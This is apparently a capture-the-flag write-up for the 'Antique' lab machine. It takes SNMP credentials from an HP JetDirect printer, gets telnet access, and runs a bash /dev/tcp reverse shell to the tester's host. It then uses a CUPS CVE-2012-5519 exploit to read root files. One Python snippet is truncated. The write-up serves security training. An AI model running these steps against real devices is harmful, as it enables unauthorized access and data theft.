
Having the IP address `10.10.11.107` for the Antique machine I start the pen testing process with an `nmap` scan to discover open ports
```shell
nmap -A -T4 10.10.11.107
```
![[Pasted image 20251021132614.png]]
- from the scan I observe that the port 23 is open for `telnet`

- Trying to connect to the machine through telnet I am met with the following text
![[Pasted image 20251021132732.png]]
- I learn that this is a `HP JetDirect` printer I suppose and that we need a password 

Searching something about this on google I found this article https://www.exploit-db.com/exploits/22319 which explains that there is a problem with `HP JetDirect` printers that could allow remote users to gain admin access to the printer
- This is done by sending an `SNMP` GET request that will return the device password

- So the next step would be to check if the `SNMP` service is running on the machine
- The `SNMP` service uses port 161 and 162 for different tasks so I will check just these 2 ports for efficiency
- I will do this through a UDP port enumeration scan with `nmap`
```shell
nmap -sUV -v -p161-162 10.10.11.107
```
![[Pasted image 20251021134233.png]]
- The scan shows that the port 161 is indeed open and used by the `SNMPv1 server`

- I will use the `snmpget` tool to send the SNMP request with some options attached:
```shell
snmpget -v1 -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
```
- `-v1` - option is used to specify the version which is `v1` from the UDP scan
- `-c public` - option is used to set the community which in our case is `public` (I get that from the UDP scan as well under the `VERSION` column in brackets)
- `10.10.11.107` - represents the host
- `.1.3.6.1.4.1.11.2.3.9.1.1.13.0` - the variable that can be exploited to get the hex-encoded device password

As a result of the `snmpget` request, I got some hex-encoded characters
![[Pasted image 20251021135059.png]]

Now with the help of python I can decode the characters
```python
import binascii
s='50 40 73 73 77 30 
binascii.unhexlify(s.replace(' ',''))
```
And I got the password I was looking for: `P@ssw0rd@123!!123`
![[Pasted image 20251021184952.png]]

Finally I can connect to the telnet server and get access to the server
![[Pasted image 20251021185252.png]]

By typing `?` in the command line I was given I found that I can execute commands and also I found that these commands are run by the `lp` user
![[Pasted image 20251021185520.png]]

I start a listener on my machine on port `4444` with `nc -lvnp 4444` and I run the following script to get a reverse shell:
```shell
exec /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.18/4444 0>&1'
```
The script was successful and I got access on the system and also got the user flag
![[Pasted image 20251021185929.png]]

## Root flag

Next step is to escalate privileges to `root` user

- After some tries I found some info when I used the `ss -tulnp` command to see if there are other port connections besides port 23 and port 161
![[Pasted image 20251021190845.png]]
- The output shows that there is an active connection on `localhost` port `631` 

- Next I use `curl` to check the contents of `localhost:631`
```shell
curl localhost:631
```
- The output shows that the port is used by `CUPS 1.6.1`
![[Pasted image 20251021191732.png]]

- CUPS is an open source printing system
- By searching for the version `1.6.1` my google search revealed that on this version there is a vulnerability that allows reading files with `root` permission 
- The vulnerability is the `CVE-2012-5519`

- I also found a Git repository containing a script that exploits this vulnerability https://github.com/p1ckzi/CVE-2012-5519

- I cloned the repo on my machine the I opened a python web server and transferred the exploit on the target machine
- Then I run the script and by entering the file path of the file I want to read I get its contents
- I tried with the `/root/root.txt` file and voila I got the system flag 
![[Pasted image 20251021193018.png]]